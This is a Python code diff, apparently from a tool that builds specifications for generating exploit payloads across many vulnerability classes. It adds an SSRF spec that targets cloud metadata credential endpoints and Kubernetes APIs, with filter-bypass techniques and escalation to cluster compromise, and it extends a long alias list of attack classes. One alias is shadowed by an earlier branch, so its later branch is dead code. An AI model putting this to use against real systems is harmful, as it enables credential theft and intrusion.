+                "(169.254.169.254 / 100.100.100.200 Alibaba / fd00:ec2::254 IPv6 AWS), "
+                "(4) which HTTP parameter controls the SSRF target, "
+                "(5) how to escalate from SSRF to cluster compromise."),
+            "schema": (
+                '  "payload": "<SSRF request targeting internal k8s/IMDS endpoint>",\n'
+                '  "target": "k8s_api|imds_aws|imds_gcp|imds_azure|etcd|kubelet",\n'
+                '  "imds_url": "<http://169.254.169.254/latest/meta-data/iam/security-credentials/>",\n'
+                '  "k8s_api_url": "<http://kubernetes.default.svc/api/v1/namespaces/>",\n'
+                '  "bypass_technique": "<IPv6/decimal-IP/redirect/DNS-rebinding>",\n'
+                '  "expected_response_indicator": "<AWS access keys / k8s service list / pod info>",\n'
+            ),
+            "defaults": {"target": "imds_aws",
+                         "imds_url": "http://169.254.169.254/latest/meta-data/",
+                         "bypass_technique": "none"},
+        },
     }
 
-    # Normalize vuln_class aliases
+    # Normalize vuln_class aliases → canonical key in _CLASS_SPECS
     _vc_normalized = _vc
     if _vc in ("sql-injection", "sqli"):
         _vc_normalized = "sqli"
-    elif _vc in ("path-traversal", "lfi", "directory-traversal", "arbitrary-file-read"):
+    elif _vc in ("path-traversal", "lfi", "directory-traversal", "arbitrary-file-read",
+                 "local-file-inclusion", "file-read"):
         _vc_normalized = "lfi"
-    elif _vc in ("arbitrary-file-upload", "file-upload", "unrestricted-file-upload"):
+    elif _vc in ("arbitrary-file-upload", "file-upload", "unrestricted-file-upload",
+                 "arbitrary-file-write"):
         _vc_normalized = "file-upload"
     elif _vc in ("missing-authorization", "broken-access-control", "idor",
-                 "insecure-direct-object-reference"):
+                 "insecure-direct-object-reference", "unauthorized-access"):
         _vc_normalized = "idor"
-    elif _vc in ("privilege-escalation", "privesc", "broken-auth"):
+    elif _vc in ("privilege-escalation", "privesc", "broken-auth",
+                 "role-escalation", "account-takeover"):
         _vc_normalized = "privesc"
-    elif _vc in ("auth-bypass", "authentication-bypass", "broken-authentication"):
+    elif _vc in ("auth-bypass", "authentication-bypass", "broken-authentication",
+                 "unauthenticated-access", "improper-authentication"):
         _vc_normalized = "auth-bypass"
     elif _vc in ("rce", "remote-code-execution", "code-injection", "command-injection",
-                 "os-command-injection"):
+                 "os-command-injection", "php-object-injection"):
         _vc_normalized = "rce"
-    elif _vc in ("server-side-template-injection", "template-injection"):
+    elif _vc in ("server-side-template-injection", "template-injection", "ssti"):
         _vc_normalized = "ssti"
-    elif _vc in ("server-side-request-forgery"):
+    elif _vc in ("server-side-request-forgery", "ssrf"):
         _vc_normalized = "ssrf"
-    elif _vc in ("cross-site-request-forgery"):
+    elif _vc in ("cross-site-request-forgery", "csrf"):
         _vc_normalized = "csrf"
-    elif _vc in ("xml-external-entity", "xml-external-entity-injection"):
+    elif _vc in ("xml-external-entity", "xml-external-entity-injection", "xxe"):
         _vc_normalized = "xxe"
+    elif _vc in ("prototype-pollution", "js-prototype-pollution"):
+        _vc_normalized = "prototype-pollution"
+    elif _vc in ("nosql-injection", "nosqli", "mongodb-injection"):
+        _vc_normalized = "nosql-injection"
+    elif _vc in ("ldap-injection", "ldapi"):
+        _vc_normalized = "ldap-injection"
+    elif _vc in ("jwt", "jwt-attack", "jwt-weakness", "jwt-bypass",
+                 "broken-jwt", "weak-jwt"):
+        _vc_normalized = "jwt-attack"
+    elif _vc in ("graphql", "graphql-injection", "graphql-idor"):
+        _vc_normalized = "graphql-injection"
+    elif _vc in ("race-condition", "toctou", "race", "time-of-check-time-of-use"):
+        _vc_normalized = "race-condition"
+    elif _vc in ("mass-assignment", "parameter-pollution", "param-pollution",
+                 "auto-binding", "over-posting"):
+        _vc_normalized = "mass-assignment"
+    elif _vc in ("web-cache-poisoning", "cache-poisoning", "cache-deception",
+                 "web-cache-deception"):
+        _vc_normalized = "cache-poisoning"
+    elif _vc in ("http-request-smuggling", "request-smuggling", "desync"):
+        _vc_normalized = "request-smuggling"
+    elif _vc in ("host-header-injection", "host-header", "x-forwarded-host-injection"):
+        _vc_normalized = "host-header-injection"
+    elif _vc in ("oauth", "oauth-bypass", "oidc", "oauth2-bypass"):
+        _vc_normalized = "oauth-bypass"
+    elif _vc in ("websocket-hijacking", "websocket", "cswsh"):
+        _vc_normalized = "websocket-hijacking"
+    elif _vc in ("xpath-injection", "xpath"):
+        _vc_normalized = "xpath-injection"
+    elif _vc in ("email-header-injection", "mail-injection", "smtp-injection"):
+        _vc_normalized = "email-header-injection"
+    elif _vc in ("business-logic", "logic-flaw", "logic-bypass"):
+        _vc_normalized = "business-logic"
+    elif _vc in ("crlf-injection", "crlf", "http-response-splitting", "response-splitting"):
+        _vc_normalized = "crlf-injection"
+    elif _vc in ("wp-rest-api", "rest-api-auth-bypass", "wp-rest"):
+        _vc_normalized = "wp-rest-api"
+    elif _vc in ("wp-shortcode", "shortcode-injection"):
+        _vc_normalized = "wp-shortcode"
+    elif _vc in ("deserialization", "insecure-deserialization"):
+        _vc_normalized = "deserialization"
+    elif _vc in ("python-ssti", "jinja2", "jinja2-ssti", "flask-ssti", "django-ssti",
+                 "mako", "mako-ssti"):
+        _vc_normalized = "python-ssti"
+    elif _vc in ("python-deserialization", "pickle", "yaml-deserialization",
+                 "pickle-injection", "unsafe-deserialization-python"):
+        _vc_normalized = "python-deserialization"
+    elif _vc in ("java-deserialization", "java-object-injection", "log4shell",
+                 "jndi-injection", "xstream-deserialization", "jackson-deserialization"):
+        _vc_normalized = "java-deserialization"
+    elif _vc in ("spring-spel", "spel-injection", "spring-expression"):
+        _vc_normalized = "spring-spel"
+    elif _vc in ("ruby-deserialization", "rails-deserialization", "marshal-deserialization",
+                 "yaml-load-ruby"):
+        _vc_normalized = "ruby-deserialization"
+    elif _vc in ("rails-mass-assignment", "rails-params", "strong-params-bypass"):
+        _vc_normalized = "rails-mass-assignment"
+    elif _vc in ("laravel-deserialization", "laravel-rce", "laravel-cookie"):
+        _vc_normalized = "laravel-deserialization"
+    elif _vc in ("php-object-injection", "php-deserialization", "phar-deserialization",
+                 "unsafe-unserialize"):
+        _vc_normalized = "php-object-injection"
+    elif _vc in ("node-rce", "node-injection", "nodejs-rce", "express-rce",
+                 "ejs-ssti", "vm2-escape"):
+        _vc_normalized = "node-rce"
+    elif _vc in ("drupal-rce", "drupalgeddon", "drupalgeddon2"):
+        _vc_normalized = "drupal-rce"
+    elif _vc in ("joomla-rce", "joomla-object-injection", "joomla-sqli"):
+        _vc_normalized = "joomla-rce"
+    elif _vc in ("dotnet-deserialization", "viewstate-injection", "asp-net-rce",
+                 ".net-deserialization", "binaryformatter"):
+        _vc_normalized = "dotnet-deserialization"
+    elif _vc in ("android-deeplink", "android-webview", "intent-injection"):
+        _vc_normalized = "android-deeplink"
+    elif _vc in ("k8s-ssrf", "kubernetes-ssrf", "imds-ssrf", "cloud-ssrf"):
+        _vc_normalized = "k8s-ssrf"
 
     spec = _CLASS_SPECS.get(_vc_normalized, _CLASS_SPECS.get("sqli"))  # fallback to sqli spec
 
